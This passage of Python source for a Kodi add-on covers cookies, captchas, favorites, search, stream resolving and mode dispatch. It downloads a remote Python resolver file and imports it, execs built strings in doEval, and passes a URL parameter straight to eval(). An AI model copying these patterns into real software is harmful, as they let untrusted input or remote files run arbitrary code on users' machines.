                p=findAndReplaceWord(p,aa,k[c])

            #p=findAndReplaceWord(p,aa,k[c])

            
    #with open('after file'+str(iteration)+'.js', "wb") as filewriter:
    #    filewriter.write(str(p))
    return p

#
#function equalavent to re.sub('\\b' + aa +'\\b', k[c], p)
def findAndReplaceWord(source_str, word_to_find,replace_with):
    splits=None
    splits=source_str.split(word_to_find)
    if len(splits)>1:
        new_string=[]
        current_index=0
        for current_split in splits:
            #print 'here',i
            new_string.append(current_split)
            val=word_to_find#by default assume it was wrong to split

            #if its first one and item is blank then check next item is valid or not
            if current_index==len(splits)-1:
                val='' # last one nothing to append normally
            else:
                if len(current_split)==0: #if blank check next one with current split value
                    if ( len(splits[current_index+1])==0 and word_to_find[0].lower() not in 'abcdefghijklmnopqrstuvwxyz1234567890_') or (len(splits[current_index+1])>0  and splits[current_index+1][0].lower() not in 'abcdefghijklmnopqrstuvwxyz1234567890_'):# first just just check next
                        val=replace_with
                #not blank, then check current endvalue and next first value
                else:
                    if (splits[current_index][-1].lower() not in 'abcdefghijklmnopqrstuvwxyz1234567890_') and (( len(splits[current_index+1])==0 and word_to_find[0].lower() not in 'abcdefghijklmnopqrstuvwxyz1234567890_') or (len(splits[current_index+1])>0  and splits[current_index+1][0].lower() not in 'abcdefghijklmnopqrstuvwxyz1234567890_')):# first just just check next
                        val=replace_with
                        
            new_string.append(val)
            current_index+=1
        #aaaa=1/0
        source_str=''.join(new_string)
    return source_str        

def __itoa(num, radix):
#    print 'num red',num, radix
    result = ""
    if num==0: return '0'
    while num > 0:
        result = "0123456789abcdefghijklmnopqrstuvwxyz"[num % radix] + result
        num /= radix
    return result
	
def __itoaNew(cc, a):
    aa="" if cc < a else __itoaNew(int(cc / a),a) 
    cc = (cc % a)
    bb=chr(cc + 29) if cc> 35 else str(__itoa(cc,36))
    return aa+bb


def getCookiesString(cookieJar):
    try:
        cookieString=""
        for index, cookie in enumerate(cookieJar):
            cookieString+=cookie.name + "=" + cookie.value +";"
    except: pass
    #print 'cookieString',cookieString
    return cookieString


def saveCookieJar(cookieJar,COOKIEFILE):
	try:
		complete_path=os.path.join(profile,COOKIEFILE)
		cookieJar.save(complete_path,ignore_discard=True)
	except: pass

def getCookieJar(COOKIEFILE):

	cookieJar=None
	if COOKIEFILE:
		try:
			complete_path=os.path.join(profile,COOKIEFILE)
			cookieJar = cookielib.LWPCookieJar()
			cookieJar.load(complete_path,ignore_discard=True)
		except: 
			cookieJar=None
	
	if not cookieJar:
		cookieJar = cookielib.LWPCookieJar()
	
	return cookieJar
    
def doEval(fun_call,page_data,Cookie_Jar):
    ret_val=''
    if functions_dir not in sys.path:
        sys.path.append(functions_dir)
    
    print fun_call
    try:
        py_file='import '+fun_call.split('.')[0]
        print py_file,sys.path
        exec( py_file)
        print 'done'
    except:
        print 'error in import'
        traceback.print_exc(file=sys.stdout)
    print 'ret_val='+fun_call
    exec ('ret_val='+fun_call)
    print ret_val
    #exec('ret_val=1+1')
    return str(ret_val)
    
def processRecaptcha(url):
	html_text=getUrl(url)
	recapChallenge=""
	solution=""
	cap_reg="<script.*?src=\"(.*?recap.*?)\""
	match =re.findall(cap_reg, html_text)
	captcha=False
	captcha_reload_response_chall=None
	solution=None
	
	if match and len(match)>0: #new shiny captcha!
		captcha_url=match[0]
		captcha=True
		
		cap_chall_reg='challenge.*?\'(.*?)\''
		cap_image_reg='\'(.*?)\''
		captcha_script=getUrl(captcha_url)
		recapChallenge=re.findall(cap_chall_reg, captcha_script)[0]
		captcha_reload='http://www.google.com/recaptcha/api/reload?c=';
		captcha_k=captcha_url.split('k=')[1]
		captcha_reload+=recapChallenge+'&k='+captcha_k+'&captcha_k=1&type=image&lang=en-GB'
		captcha_reload_js=getUrl(captcha_reload)
		captcha_reload_response_chall=re.findall(cap_image_reg, captcha_reload_js)[0]
		captcha_image_url='http://www.google.com/recaptcha/api/image?c='+captcha_reload_response_chall
		if not captcha_image_url.startswith("http"):
			captcha_image_url='http://www.google.com/recaptcha/api/'+captcha_image_url
		import random
		n=random.randrange(100,1000,5)
		local_captcha = os.path.join(profile,str(n) +"captcha.img" )
		localFile = open(local_captcha, "wb")
		localFile.write(getUrl(captcha_image_url))
		localFile.close()
		solver = InputWindow(captcha=local_captcha)
		solution = solver.get()
		os.remove(local_captcha)
	return captcha_reload_response_chall ,solution

def getUrl(url, cookieJar=None,post=None, timeout=20, headers=None):


	cookie_handler = urllib2.HTTPCookieProcessor(cookieJar)
	opener = urllib2.build_opener(cookie_handler, urllib2.HTTPBasicAuthHandler(), urllib2.HTTPHandler())
	#opener = urllib2.install_opener(opener)
	req = urllib2.Request(url)
	req.add_header('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36')
	if headers:
		for h,hv in headers:
			req.add_header(h,hv)

	response = opener.open(req,post,timeout=timeout)
	link=response.read()
	response.close()
	return link;

def get_decode(str,reg=None):
	if reg:
		str=re.findall(reg, str)[0]
	s1 = urllib.unquote(str[0: len(str)-1]);
	t = '';
	for i in range( len(s1)):
		t += chr(ord(s1[i]) - s1[len(s1)-1]);
	t=urllib.unquote(t)
	print t
	return t

def javascriptUnEscape(str):
	js=re.findall('unescape\(\'(.*?)\'',str)
	print 'js',js
	if (not js==None) and len(js)>0:
		for j in js:
			#print urllib.unquote(j)
			str=str.replace(j ,urllib.unquote(j))
	return str

iid=0
def askCaptcha(m,html_page, cookieJar):
    global iid
    iid+=1
    expre= m['expre']
    page_url = m['page']
    captcha_regex=re.compile('\$LiveStreamCaptcha\[([^\]]*)\]').findall(expre)[0]

    captcha_url=re.compile(captcha_regex).findall(html_page)[0]
    print expre,captcha_regex,captcha_url
    if not captcha_url.startswith("http"):
        page_='http://'+"".join(page_url.split('/')[2:3])
        if captcha_url.startswith("/"):
            captcha_url=page_+captcha_url
        else:
            captcha_url=page_+'/'+captcha_url
    
    local_captcha = os.path.join(profile, str(iid)+"captcha.jpg" )
    localFile = open(local_captcha, "wb")
    print ' c capurl',captcha_url
    req = urllib2.Request(captcha_url)
    req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; rv:14.0) Gecko/20100101 Firefox/14.0.1')
    if 'refer' in m:
        req.add_header('Referer', m['refer'])
    if 'agent' in m:
        req.add_header('User-agent', m['agent'])
    if 'setcookie' in m:
        print 'adding cookie',m['setcookie']
        req.add_header('Cookie', m['setcookie'])
        
    #cookie_handler = urllib2.HTTPCookieProcessor(cookieJar)
    #opener = urllib2.build_opener(cookie_handler, urllib2.HTTPBasicAuthHandler(), urllib2.HTTPHandler())
    #opener = urllib2.install_opener(opener)
    urllib2.urlopen(req)
    response = urllib2.urlopen(req)

    localFile.write(response.read())
    response.close()
    localFile.close()
    solver = InputWindow(captcha=local_captcha)
    solution = solver.get()
    return solution
    
class InputWindow(xbmcgui.WindowDialog):
    def __init__(self, *args, **kwargs):
        self.cptloc = kwargs.get('captcha')
        self.img = xbmcgui.ControlImage(335,30,624,60,self.cptloc)
        self.addControl(self.img)
        self.kbd = xbmc.Keyboard()

    def get(self):
        self.show()
        time.sleep(2)        
        self.kbd.doModal()
        if (self.kbd.isConfirmed()):
            text = self.kbd.getText()
            self.close()
            return text
        self.close()
        return False
    
def getEpocTime():
    import time
    return str(int(time.time()*1000))

def getEpocTime2():
    import time
    return str(int(time.time()))

def get_params():
        param=[]
        paramstring=sys.argv[2]
        if len(paramstring)>=2:
            params=sys.argv[2]
            cleanedparams=params.replace('?','')
            if (params[len(params)-1]=='/'):
                params=params[0:len(params)-2]
            pairsofparams=cleanedparams.split('&')
            param={}
            for i in range(len(pairsofparams)):
                splitparams={}
                splitparams=pairsofparams[i].split('=')
                if (len(splitparams))==2:
                    param[splitparams[0]]=splitparams[1]
        return param


def getFavorites():
        items = json.loads(open(favorites).read())
        total = len(items)
        for i in items:
            name = i[0]
            url = i[1]
            iconimage = i[2]
            try:
                fanArt = i[3]
                if fanArt == None:
                    raise
            except:
                if addon.getSetting('use_thumb') == "true":
                    fanArt = iconimage
                else:
                    fanArt = fanart
            try: playlist = i[5]
            except: playlist = None
            try: regexs = i[6]
            except: regexs = None

            if i[4] == 0:
                addLink(url,name,iconimage,fanArt,'','','','fav',playlist,regexs,total)
            else:
                addDir(name,url,i[4],iconimage,fanart,'','','','','fav')


def addFavorite(name,url,iconimage,fanart,mode,playlist=None,regexs=None):
        favList = []
        try:
            # seems that after 
            name = name.encode('utf-8', 'ignore')
        except:
            pass
        if os.path.exists(favorites)==False:
            addon_log('Making Favorites File')
            favList.append((name,url,iconimage,fanart,mode,playlist,regexs))
            a = open(favorites, "w")
            a.write(json.dumps(favList))
            a.close()
        else:
            addon_log('Appending Favorites')
            a = open(favorites).read()
            data = json.loads(a)
            data.append((name,url,iconimage,fanart,mode))
            b = open(favorites, "w")
            b.write(json.dumps(data))
            b.close()


def rmFavorite(name):
        data = json.loads(open(favorites).read())
        for index in range(len(data)):
            if data[index][0]==name:
                del data[index]
                b = open(favorites, "w")
                b.write(json.dumps(data))
                b.close()
                break
        xbmc.executebuiltin("XBMC.Container.Refresh")

def urlsolver(url):
    if addon.getSetting('Updatecommonresolvers') == 'true':
        l = os.path.join(home,'genesisresolvers.py')
        if xbmcvfs.exists(l):
            os.remove(l)

        genesis_url = 'https://raw.githubusercontent.com/lambda81/lambda-addons/master/plugin.video.genesis/commonresolvers.py'
        th= urllib.urlretrieve(genesis_url,l)
        addon.setSetting('Updatecommonresolvers', 'false')
    try:
        import genesisresolvers
    except Exception:
        xbmc.executebuiltin("XBMC.Notification(dijentertainments,Please enable Update Commonresolvers to Play in Settings. - ,10000)")

    resolved=genesisresolvers.get(url).result
    if url == resolved or resolved is None:
        #import
       
        import urlresolver
        host = urlresolver.HostedMediaFile(url)
        if host:
            resolver = urlresolver.resolve(url)
            resolved = resolver
    if resolved :
        if isinstance(resolved,list):
            for k in resolved:
                quality = addon.getSetting('quality')
                if k['quality'] == 'HD'  :
                    resolver = k['url']
                    break
                elif k['quality'] == 'SD' :
                    resolver = k['url']
                elif k['quality'] == '1080p' and addon.getSetting('1080pquality') == 'true' :
                    resolver = k['url']
                    break
        else:
            resolver = resolved
    return resolver
def play_playlist(name, mu_playlist):
        import urlparse
        if addon.getSetting('ask_playlist_items') == 'true':
            names = []
            for i in mu_playlist:
                d_name=urlparse.urlparse(i).netloc
                if d_name == '':
                    names.append(name)
                else:
                    names.append(d_name)
            dialog = xbmcgui.Dialog()
            index = dialog.select('Choose a video source', names)
            if index >= 0:
                if "&mode=19" in mu_playlist[index]:
                    xbmc.Player().play(urlsolver(mu_playlist[index].replace('&mode=19','')))
                elif "$doregex" in mu_playlist[index] :

                    sepate = mu_playlist[index].split('&regexs=')

                    url,setresolved = getRegexParsed(sepate[1], sepate[0])
                    xbmc.Player().play(url)
                else:
                    url = mu_playlist[index]
                    xbmc.Player().play(url)
        else:
            playlist = xbmc.PlayList(1) # 1 means video
            playlist.clear()
            item = 0
            for i in mu_playlist:
                item += 1
                info = xbmcgui.ListItem('%s) %s' %(str(item),name))
                playlist.add(i, info)
                xbmc.executebuiltin('playlist.playoffset(video,0)')


def download_file(name, url):
        if addon.getSetting('save_location') == "":
            xbmc.executebuiltin("XBMC.Notification('dijentertainments','Choose a location to save files.',15000,"+icon+")")
            addon.openSettings()
        params = {'url': url, 'download_path': addon.getSetting('save_location')}
        downloader.download(name, params)
        dialog = xbmcgui.Dialog()
        ret = dialog.yesno('dijentertainments', 'Do you want to add this file as a source?')
        if ret:
            addSource(os.path.join(addon.getSetting('save_location'), name))


def addDir(name,url,mode,iconimage,fanart,description,genre,date,credits,showcontext=False):
        
        u=sys.argv[0]+"?url="+urllib.quote_plus(url)+"&mode="+str(mode)+"&name="+urllib.quote_plus(name)+"&fanart="+urllib.quote_plus(fanart)
        ok=True
        if date == '':
            date = None
        else:
            description += '\n\nDate: %s' %date
        liz=xbmcgui.ListItem(name, iconImage="DefaultFolder.png", thumbnailImage=iconimage)
        liz.setInfo(type="Video", infoLabels={ "Title": name, "Plot": description, "Genre": genre, "dateadded": date, "credits": credits })
        liz.setProperty("Fanart_Image", fanart)
        if showcontext:
            contextMenu = []
            if showcontext == 'source':
                if name in str(SOURCES):
                    contextMenu.append(('Remove from Sources','XBMC.RunPlugin(%s?mode=8&name=%s)' %(sys.argv[0], urllib.quote_plus(name))))
            elif showcontext == 'download':
                contextMenu.append(('Download','XBMC.RunPlugin(%s?url=%s&mode=9&name=%s)'
                                    %(sys.argv[0], urllib.quote_plus(url), urllib.quote_plus(name))))
            elif showcontext == 'fav':
                contextMenu.append(('Remove from dijentertainments Favorites','XBMC.RunPlugin(%s?mode=6&name=%s)'
                                    %(sys.argv[0], urllib.quote_plus(name))))
									
            if not name in FAV:
                contextMenu.append(('Add to dijentertainments Favorites','XBMC.RunPlugin(%s?mode=5&name=%s&url=%s&iconimage=%s&fanart=%s&fav_mode=%s)'
                         %(sys.argv[0], urllib.quote_plus(name), urllib.quote_plus(url), urllib.quote_plus(iconimage), urllib.quote_plus(fanart), mode)))
            liz.addContextMenuItems(contextMenu)
        ok=xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=u,listitem=liz,isFolder=True)

        return ok
def ytdl_download(url,title,media_type='video'):
    # play in xbmc while playing go back to contextMenu(c) to "!!Download!!"
    # Trial yasceen: seperate |User-Agent=
    import youtubedl
    if not url == '':
        if media_type== 'audio':
            youtubedl.single_YD(url,download=True,audio=True)
        else:
            youtubedl.single_YD(url,download=True)   
    elif xbmc.Player().isPlaying() == True :
        import YDStreamExtractor
        if YDStreamExtractor.isDownloading() == True:

            YDStreamExtractor.manageDownloads()
        else:
            xbmc_url = xbmc.Player().getPlayingFile()

            xbmc_url = xbmc_url.split('|User-Agent=')[0]
            info = {'url':xbmc_url,'title':title,'media_type':media_type}
            youtubedl.single_YD('',download=True,dl_info=info)    
    else:
        xbmc.executebuiltin("XBMC.Notification(DOWNLOAD,First Play [COLOR yellow]WHILE playing download[/COLOR] ,10000)")
 
def search(site_name,search_term=None):
    thumbnail=''
    if os.path.exists(history) == False or addon.getSetting('clearseachhistory')=='true':
        SaveToFile(history,'')
        addon.setSetting("clearseachhistory","false")
    if site_name == 'history' :
        content = LoadFile(history)
        match = re.compile('(.+?):(.*?)(?:\r|\n)').findall(content)

        for name,search_term in match:
            if 'plugin://' in search_term:
                addLink(search_term, name,thumbnail,'','','','','',None,'',total=int(len(match)))
            else:
                addDir(name+':'+search_term,name,26,icon,FANART,'','','','')
    if not search_term:    
        keyboard = xbmc.Keyboard('','Enter Search Term')
        keyboard.doModal()
        if (keyboard.isConfirmed() == False):
            return
        search_term = keyboard.getText()
        if len(search_term) == 0:
            return        
    search_term = search_term.replace(' ','+')
    search_term = search_term.encode('utf-8')
    if 'youtube' in site_name:
        #youtube = youtube#Lana Del Rey
        import _ytplist

        search_res = {}
        search_res = _ytplist.YoUTube('searchYT',youtube=search_term,max_page=4,nosave='nosave')
        total = len(search_res)
        for item in search_res:
            try:
                name = search_res[item]['title']
                date= search_res[item]['date']
                try:
                    description = search_res[item]['desc']
                except Exception:
                    description = 'UNAVAIABLE'

                url = 'plugin://plugin.video.youtube/play/?video_id=' + search_res[item]['url']
                thumbnail ='http://img.youtube.com/vi/'+search_res[item]['url']+'/0.jpg'
                addLink(url, name,thumbnail,'','','','','',None,'',total)
            except Exception:
            	addon_log( 'This item is ignored::')
        page_data = site_name +':'+ search_term + '\n'
        SaveToFile(os.path.join(profile,'history'),page_data,append=True)
    elif 'dmotion' in site_name:
        urlMain = "https://api.dailymotion.com" 
        #youtube = youtube#Lana Del Rey
        import _DMsearch
        familyFilter = str(addon.getSetting('familyFilter'))
        _DMsearch.listVideos(urlMain+"/videos?fields=description,duration,id,owner.username,taken_time,thumbnail_large_url,title,views_total&search="+search_term+"&sort=relevance&limit=100&family_filter="+familyFilter+"&localization=en_EN&page=1")
    
        page_data = site_name +':'+ search_term+ '\n'
        SaveToFile(os.path.join(profile,'history'),page_data,append=True)        
    elif 'IMDBidplay' in site_name:
        urlMain = "http://www.omdbapi.com/?t=" 
        url= urlMain+search_term

        headers = dict({'User-Agent':'Mozilla/5.0 (Windows NT 6.3; rv:33.0) Gecko/20100101 Firefox/33.0','Referer': 'http://joker.org/','Accept-Encoding':'gzip, deflate','Content-Type': 'application/json;charset=utf-8','Accept': 'application/json, text/plain, */*'})
    
        r=requests.get(url,headers=headers)
        data = r.json()
        res = data['Response']
        if res == 'True':
            imdbID = data['imdbID']
            name= data['Title'] + data['Released']
            dialog = xbmcgui.Dialog()
            ret = dialog.yesno('Check Movie Title', 'PLAY :: %s ?'%name)
            if ret:
                url = 'plugin://plugin.video.pulsar/movie/'+imdbID+'/play'
                page_data = name +':'+ url+ '\n'
                SaveToFile(history,page_data,append=True)
                return url
        else:
            xbmc.executebuiltin("XBMC.Notification(dijentertainments,No IMDB match found ,7000,"+icon+")")
## Lunatixz PseudoTV feature
def ascii(string):
    if isinstance(string, basestring):
        if isinstance(string, unicode):
           string = string.encode('ascii', 'ignore')
    return string
def uni(string, encoding = 'utf-8'):
    if isinstance(string, basestring):
        if not isinstance(string, unicode):
            string = unicode(string, encoding, 'ignore')
    return string
def removeNonAscii(s): return "".join(filter(lambda x: ord(x)<128, s))

def sendJSON( command):
    data = ''
    try:
        data = xbmc.executeJSONRPC(uni(command))
    except UnicodeEncodeError:
        data = xbmc.executeJSONRPC(ascii(command))

    return uni(data)

#hakamac thanks Roman_V_M
def SetViewThumbnail():
    skin_used = xbmc.getSkinDir()
    if skin_used == 'skin.confluence':
        xbmc.executebuiltin('Container.SetViewMode(500)')
    elif skin_used == 'skin.aeon.nox':
        xbmc.executebuiltin('Container.SetViewMode(511)') 
    else:
        xbmc.executebuiltin('Container.SetViewMode(500)')
	
	
def pluginquerybyJSON(url):
    json_query = uni('{"jsonrpc":"2.0","method":"Files.GetDirectory","params":{"directory":"%s","media":"video","properties":["thumbnail","title","year","dateadded","fanart","rating","season","episode","studio"]},"id":1}') %url

    json_folder_detail = json.loads(sendJSON(json_query))
    for i in json_folder_detail['result']['files'] :
        url = i['file']
        name = removeNonAscii(i['label'])
        thumbnail = removeNonAscii(i['thumbnail'])
        try:
            fanart = removeNonAscii(i['fanart'])
        except Exception:
            fanart = ''
        try:
            date = i['year']
        except Exception:
            date = ''
        try:
            episode = i['episode']
            season = i['season']
            if episode == -1 or season == -1:
                description = ''
            else:
                description = '[COLOR yellow] S' + str(season)+'[/COLOR][COLOR hotpink] E' + str(episode) +'[/COLOR]'
        except Exception:
            description = ''
        try:
            studio = i['studio']
            if studio:
                description += '\n Studio:[COLOR steelblue] ' + studio[0] + '[/COLOR]'
        except Exception:
            studio = ''

        if i['filetype'] == 'file':
            addLink(url,name,thumbnail,fanart,description,'',date,'',None,'',total=len(json_folder_detail['result']['files']))
            #xbmc.executebuiltin("Container.SetViewMode(500)")

        else:
            addDir(name,url,53,thumbnail,fanart,description,'',date,'')
            #xbmc.executebuiltin("Container.SetViewMode(500)")

def addLink(url,name,iconimage,fanart,description,genre,date,showcontext,playlist,regexs,total,setCookie=""):
        #print 'url,name',url,name
        contextMenu =[]
        try:
            name = name.encode('utf-8')
        except: pass
        ok = True
       
        if regexs: 
            mode = '17'
           
            contextMenu.append(('[COLOR white]!!Download Currently Playing!![/COLOR]','XBMC.RunPlugin(%s?url=%s&mode=21&name=%s)'
                                    %(sys.argv[0], urllib.quote_plus(url), urllib.quote_plus(name))))           
        elif  any(x in url for x in resolve_url) and  url.startswith('http'):
            mode = '19'
          
            contextMenu.append(('[COLOR white]!!Download Currently Playing!![/COLOR]','XBMC.RunPlugin(%s?url=%s&mode=21&name=%s)'
                                    %(sys.argv[0], urllib.quote_plus(url), urllib.quote_plus(name))))           
        elif url.endswith('&mode=18'):
            url=url.replace('&mode=18','')
            mode = '18' 
          
            contextMenu.append(('[COLOR white]!!Download!![/COLOR]','XBMC.RunPlugin(%s?url=%s&mode=23&name=%s)'
                                    %(sys.argv[0], urllib.quote_plus(url), urllib.quote_plus(name)))) 
            if addon.getSetting('dlaudioonly') == 'true':
                contextMenu.append(('!!Download [COLOR seablue]Audio!![/COLOR]','XBMC.RunPlugin(%s?url=%s&mode=24&name=%s)'
                                        %(sys.argv[0], urllib.quote_plus(url), urllib.quote_plus(name))))                                     
        elif url.startswith('magnet:?xt=') or '.torrent' in url:
          
            if '&' in url and not '&amp;' in url :
                url = url.replace('&','&amp;')
            url = 'plugin://plugin.video.pulsar/play?uri=' + url
            mode = '12'
                     
        else: 
            mode = '12'
      
            contextMenu.append(('[COLOR white]!!Download Currently Playing!![/COLOR]','XBMC.RunPlugin(%s?url=%s&mode=21&name=%s)'
                                    %(sys.argv[0], urllib.quote_plus(url), urllib.quote_plus(name))))           
        u=sys.argv[0]+"?"
        play_list = False
      
        if playlist:
            if addon.getSetting('add_playlist') == "false":
                u += "url="+urllib.quote_plus(url)+"&mode="+mode
            else:
                u += "mode=13&name=%s&playlist=%s" %(urllib.quote_plus(name), urllib.quote_plus(str(playlist).replace(',','||')))
                name = name + '[COLOR magenta] (' + str(len(playlist)) + ' items )[/COLOR]'
                play_list = True
        else:
            u += "url="+urllib.quote_plus(url)+"&mode="+mode
        if regexs:
            u += "&regexs="+regexs
        if not setCookie == '':
            u += "&setCookie="+urllib.quote_plus(setCookie)
  
        if date == '':
            date = None
        else:
            description += '\n\nDate: %s' %date
        liz=xbmcgui.ListItem(name, iconImage="DefaultVideo.png", thumbnailImage=iconimage)
        liz.setInfo(type="Video", infoLabels={ "Title": name, "Plot": description, "Genre": genre, "dateadded": date })
        liz.setProperty("Fanart_Image", fanart)
        
        if (not play_list) and not any(x in url for x in g_ignoreSetResolved):#  (not url.startswith('plugin://plugin.video.f4mTester')):
            if regexs:
                if '$pyFunction:playmedia(' not in urllib.unquote_plus(regexs) and 'notplayable' not in urllib.unquote_plus(regexs)  :
                    #print 'setting isplayable',url, urllib.unquote_plus(regexs),url
                    liz.setProperty('IsPlayable', 'true')
            else:
                liz.setProperty('IsPlayable', 'true')
        else:
            addon_log( 'NOT setting isplayable'+url)
       
        if showcontext:
            contextMenu = []
            if showcontext == 'fav':
                contextMenu.append(
                    ('Remove from dijentertainments Favorites','XBMC.RunPlugin(%s?mode=6&name=%s)'
                     %(sys.argv[0], urllib.quote_plus(name)))
                     )
            elif not name in FAV:
                fav_params = (
                    '%s?mode=5&name=%s&url=%s&iconimage=%s&fanart=%s&fav_mode=0'
                    %(sys.argv[0], urllib.quote_plus(name), urllib.quote_plus(url), urllib.quote_plus(iconimage), urllib.quote_plus(fanart))
                    )
                if playlist:
                    fav_params += 'playlist='+urllib.quote_plus(str(playlist).replace(',','||'))
                if regexs:
                    fav_params += "&regexs="+regexs
                contextMenu.append(('Add to dijentertainments Favorites','XBMC.RunPlugin(%s)' %fav_params))
            liz.addContextMenuItems(contextMenu)
       
        if not playlist is None:
            if addon.getSetting('add_playlist') == "false":
                playlist_name = name.split(') ')[1]
                contextMenu_ = [
                    ('Play '+playlist_name+' PlayList','XBMC.RunPlugin(%s?mode=13&name=%s&playlist=%s)'
                     %(sys.argv[0], urllib.quote_plus(playlist_name), urllib.quote_plus(str(playlist).replace(',','||'))))
                     ]
                liz.addContextMenuItems(contextMenu_)
        #print 'adding',name
 #       print url,totalitems
        ok=xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=u,listitem=liz,totalItems=total)
        #print 'added',name
        return ok

def playsetresolved(url,name,iconimage,setresolved=True):
    if setresolved:
        liz = xbmcgui.ListItem(name, iconImage=iconimage)
        liz.setInfo(type='Video', infoLabels={'Title':name})
        liz.setProperty("IsPlayable","true")
        liz.setPath(str(url))
        xbmcplugin.setResolvedUrl(int(sys.argv[1]), True, liz)
    else:
        xbmc.executebuiltin('XBMC.RunPlugin('+url+')')      


## Thanks to daschacka, an epg scraper for http://i.teleboy.ch/programm/station_select.php
##  http://forum.xbmc.org/post.php?p=936228&postcount=1076
def getepg(link):
        url=urllib.urlopen(link)
        source=url.read()
        url.close()
        source2 = source.split("Jetzt")
        source3 = source2[1].split('programm/detail.php?const_id=')
        sourceuhrzeit = source3[1].split('<br /><a href="/')
        nowtime = sourceuhrzeit[0][40:len(sourceuhrzeit[0])]
        sourcetitle = source3[2].split("</a></p></div>")
        nowtitle = sourcetitle[0][17:len(sourcetitle[0])]
        nowtitle = nowtitle.encode('utf-8')
        return "  - "+nowtitle+" - "+nowtime


def get_epg(url, regex):
        data = makeRequest(url)
        try:
            item = re.findall(regex, data)[0]
            return item
        except:
            addon_log('regex failed')
            addon_log(regex)
            return


xbmcplugin.setContent(int(sys.argv[1]), 'movies')

try:
    xbmcplugin.addSortMethod(int(sys.argv[1]), xbmcplugin.SORT_METHOD_UNSORTED)
except:
    pass
try:
    xbmcplugin.addSortMethod(int(sys.argv[1]), xbmcplugin.SORT_METHOD_LABEL)
except:
    pass
try:
    xbmcplugin.addSortMethod(int(sys.argv[1]), xbmcplugin.SORT_METHOD_DATE)
except:
    pass
try:
    xbmcplugin.addSortMethod(int(sys.argv[1]), xbmcplugin.SORT_METHOD_GENRE)
except:
    pass

params=get_params()

url=None
name=None
mode=None
playlist=None
iconimage=None
fanart=FANART
playlist=None
fav_mode=None
regexs=None

try:
    url=urllib.unquote_plus(params["url"]).decode('utf-8')
except:
    pass
try:
    name=urllib.unquote_plus(params["name"])
except:
    pass
try:
    iconimage=urllib.unquote_plus(params["iconimage"])
except:
    pass
try:
    fanart=urllib.unquote_plus(params["fanart"])
except:
    pass
try:
    mode=int(params["mode"])
except:
    pass
try:
    playlist=eval(urllib.unquote_plus(params["playlist"]).replace('||',','))
except:
    pass
try:
    fav_mode=int(params["fav_mode"])
except:
    pass
try:
    regexs=params["regexs"]
except:
    pass

addon_log("Mode: "+str(mode))
if not url is None:
    addon_log("URL: "+str(url.encode('utf-8')))
addon_log("Name: "+str(name))

if mode==None:
    addon_log("Index")
    DIJIndex()	

elif mode==1:
    addon_log("getData")
    getData(url,fanart)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==2:
    addon_log("getChannelItems")
    getChannelItems(name,url,fanart)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==3:
    addon_log("getSubChannelItems")
    getSubChannelItems(name,url,fanart)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==4:
    addon_log("getFavorites")
    getFavorites()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==5:
    addon_log("addFavorite")
    try:
        name = name.split('\\ ')[1]
    except:
        pass
    try:
        name = name.split('  - ')[0]
    except:
        pass
    addFavorite(name,url,iconimage,fanart,fav_mode)

elif mode==6:
    addon_log("rmFavorite")
    try:
        name = name.split('\\ ')[1]
    except:
        pass
    try:
        name = name.split('  - ')[0]
    except:
        pass
    rmFavorite(name)

elif mode==7:
    addon_log("addSource")
    addSource(url)

elif mode==8:
    addon_log("rmSource")
    rmSource(name)

elif mode==9:
    addon_log("download_file")
    download_file(name, url)

elif mode==10:
    addon_log("getCommunitySources")
    getCommunitySources()

elif mode==11:
    addon_log("addSource")
    addSource(url)

elif mode==12:
    addon_log("setResolvedUrl")
    if not url.startswith("plugin://plugin") or not any(x in url for x in g_ignoreSetResolved):#not url.startswith("plugin://plugin.video.f4mTester") :
        item = xbmcgui.ListItem(path=url)
        xbmcplugin.setResolvedUrl(int(sys.argv[1]), True, item)
    else:
        print 'Not setting setResolvedUrl'
        xbmc.executebuiltin('XBMC.RunPlugin('+url+')')


elif mode==13:
    addon_log("play_playlist")
    play_playlist(name, playlist)

elif mode==14:
    addon_log("get_xml_database")
    get_xml_database(url)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==15:
    addon_log("browse_xml_database")
    get_xml_database(url, True)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==16:
    addon_log("browse_community")
    getCommunitySources(True)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))

elif mode==17:
    addon_log("getRegexParsed")
    url,setresolved = getRegexParsed(regexs, url)
    if url:
        playsetresolved(url,name,iconimage,setresolved)
    else:
        xbmc.executebuiltin("XBMC.Notification(dijentertainments,Failed to extract regex. - "+"this"+",4000,"+icon+")")
elif mode==18:
    addon_log("youtubedl")
    try:
        import youtubedl
    except Exception:
        xbmc.executebuiltin("XBMC.Notification(dijentertainments,Please [COLOR yellow]install Youtube-dl[/COLOR] module ,10000,"")")
    stream_url=youtubedl.single_YD(url)
    playsetresolved(stream_url,name,iconimage)
elif mode==19:
	addon_log("Genesiscommonresolvers")
	playsetresolved (urlsolver(url),name,iconimage,True)	

elif mode==21:
    addon_log("download current file using youtube-dl service")
    ytdl_download('',name,'video')
elif mode==23:
    addon_log("get info then download")
    ytdl_download(url,name,'video') 
elif mode==24:
    addon_log("Audio only youtube download")
    ytdl_download(url,name,'audio')
elif mode==25:
    addon_log("YouTube/DMotion")
    search(url)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))
elif mode==26:
    addon_log("YouTube/DMotion From Search History")
    name = name.split(':')
    search(url,search_term=name[1])
    xbmcplugin.endOfDirectory(int(sys.argv[1]))
elif mode==27:
    addon_log("Using IMDB id to play in Pulsar")
    pulsarIMDB=search(url)
    xbmc.Player().play(pulsarIMDB) 
elif mode==30:
    GetSublinks(name,url,iconimage,fanart)
	
elif mode==40:
    SearchChannels()
    SetViewThumbnail()
    xbmcplugin.endOfDirectory(int(sys.argv[1]))
	
elif mode==53:
    addon_log("Requesting JSON-RPC Items")
    pluginquerybyJSON(url)
    xbmcplugin.endOfDirectory(int(sys.argv[1]))
	
